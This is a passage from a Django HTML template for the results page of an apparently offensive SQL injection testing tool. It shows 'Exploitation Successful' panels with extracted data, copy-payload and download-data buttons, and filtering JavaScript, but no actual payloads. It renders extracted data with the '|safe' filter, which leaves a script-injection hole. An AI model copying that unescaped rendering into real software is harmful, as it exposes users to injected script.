                                                        <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                                                    </svg>
                                                    Download Proof
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                {% endif %}
                                
                                <!-- Exploitation Results -->
                                {% if result.is_exploitable and result.extracted_data %}
                                <div class="mb-4 p-4 bg-red-50 dark:bg-red-900/20 border-l-4 border-red-500 rounded">
                                    <div class="flex items-start gap-2">
                                        <svg class="w-5 h-5 text-red-600 dark:text-red-400 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                                        </svg>
                                        <div class="flex-1">
                                            <strong class="text-red-800 dark:text-red-300">üí£ Exploitation Successful</strong>
                                            <div class="mt-2 text-xs text-red-700 dark:text-red-400">
                                                <pre class="whitespace-pre-wrap">{{ result.extracted_data|safe }}</pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                {% endif %}
                                
                                <!-- Actions -->
                                <div class="flex gap-2 mt-4">
                                    <a href="{% url 'sql_attacker:result_detail' result.id %}" class="btn btn-sm btn-primary">
                                        üëÅÔ∏è View Details
                                    </a>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ result.test_payload|escapejs }}', this)">
                                        üìã Copy Payload
                                    </button>
                                    {% if result.extracted_data %}
                                    <button class="btn btn-sm btn-info" onclick="downloadExploitData({{ result.id }})">
                                        üíæ Download Data
                                    </button>
                                    {% endif %}
                                </div>
                            </div>
                        </div>
                        {% endfor %}
                    </div>
                    {% else %}
                    <div class="text-center py-12">
                        <div class="text-6xl mb-4">üéØ</div>
                        <h4 class="text-xl font-semibold text-gray-900 dark:text-white mb-2">No Multi-Context Results Yet</h4>
                        <p class="text-gray-600 dark:text-gray-400 mb-4">Run multi-context attacks to discover vulnerabilities across different injection types</p>
                        <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary">
                            ‚ûï Create Multi-Context Attack
                        </a>
                    </div>
                    {% endif %}
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_script %}
<script src="{% static 'sql_attacker/js/dashboard.js' %}"></script>
<script>
// Multi-context result filtering
function filterByContext(context) {
    const results = document.querySelectorAll('.context-result');
    results.forEach(result => {
        if (context === 'all' || result.dataset.context === context) {
            result.style.display = 'block';
        } else {
            result.style.display = 'none';
        }
    });
}

// Visual proof fullscreen modal (mirroring scanner pattern)
function showVisualProof(path, type, resultId) {
    const modal = document.createElement('div');
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.9);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 9999;
        padding: 20px;
    `;
    
    const closeBtn = document.createElement('button');
    closeBtn.textContent = '√ó';
    closeBtn.style.cssText = `
        position: absolute;
        top: 20px;
        right: 20px;
        background: white;
        border: none;
        border-radius: 50%;
        width: 32px;
        height: 32px;
        font-size: 20px;
        cursor: pointer;
        z-index: 10000;
        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    `;
    closeBtn.onclick = () => document.body.removeChild(modal);
    
    const img = document.createElement('img');
    img.src = '/' + path;
    img.alt = `Visual proof for result ${resultId}`;
    img.style.cssText = `
        max-width: 100%;
        max-height: 90vh;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    `;
    
    modal.appendChild(closeBtn);
    modal.appendChild(img);
    document.body.appendChild(modal);
    
    // Close on background click
    modal.onclick = (e) => {
        if (e.target === modal) {
            document.body.removeChild(modal);
        }
    };
}

// Download exploit data
function downloadExploitData(resultId) {
    // TODO: Implement proper URL resolution via Django template or data attribute
    // For now, using hardcoded path - should be replaced with proper URL tag pattern
    window.location.href = `/sql_attacker/result/${resultId}/download/`;
}
</script>
{% endblock %}
